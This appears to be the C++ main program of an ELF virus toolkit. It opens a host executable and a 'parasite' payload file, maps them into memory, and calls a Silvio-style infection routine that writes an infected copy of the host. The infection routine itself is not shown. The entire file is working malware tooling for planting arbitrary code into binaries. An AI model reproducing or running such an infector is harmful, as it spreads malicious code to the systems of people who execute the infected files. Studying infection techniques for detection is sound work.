#include "common/file_descriptor.hh"
#include "common/mmap.hh"
#include "infector/silvio.hh"
#include "std/errno.hh"
#include "std/stdio.hh"
#include "std/stdlib.hh"
#include "std/string.hh"

int main(int argc, char** argv) {
  if (argc != 4) {
    printf(
        "[*] Usage %s <host> <payload> <virus>\n"
        "\thost: the elf to be infected\n"
        "\tpayload: the payload that will be added to the host\n"
        "\toutput the infected output\n",
        argv[0]);

    return EXIT_FAILURE;
  }

  vt::common::FileDescriptor host(argv[1], O_RDONLY);
  if (!host.valid()) {
    printf("failed open host: %d\n", errno);
    return EXIT_FAILURE;
  }

  vt::common::FileDescriptor parasite(argv[2], O_RDONLY);
  if (!parasite.valid()) {
    printf("failed to open parasite: %d\n", errno);
    return EXIT_FAILURE;
  }

  vt::common::FileDescriptor output(argv[3], O_CREAT | O_RDWR, S_IRWXU);
  if (!output.valid()) {
    printf("failed to open output file: %d\n", errno);
    return EXIT_FAILURE;
  }

  ftruncate(output.handle(), host.file_size());

  vt::common::Mmap<PROT_READ> host_mapping(host.file_size(), MAP_SHARED,
                                           host.handle(), 0);
  vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                               parasite.handle(), 0);
  vt::common::Mmap<PROT_READ | PROT_WRITE> output_mapping(
      output.file_size(), MAP_SHARED, output.handle(), 0);

  vt::common::Mmap<PROT_READ | PROT_WRITE> parasite_cpy(
      parasite.file_size(), MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  memcpy(parasite_cpy.mutable_base(), parasite_mapping.base(),
         parasite_mapping.size());

  if (vt::infector::silvio_infect(vt::move(host_mapping),
                                  vt::move(parasite_cpy),
                                  vt::move(output_mapping))) {
    printf("infected %s\n", argv[1]);

    return EXIT_SUCCESS;
  }

  return EXIT_FAILURE;
}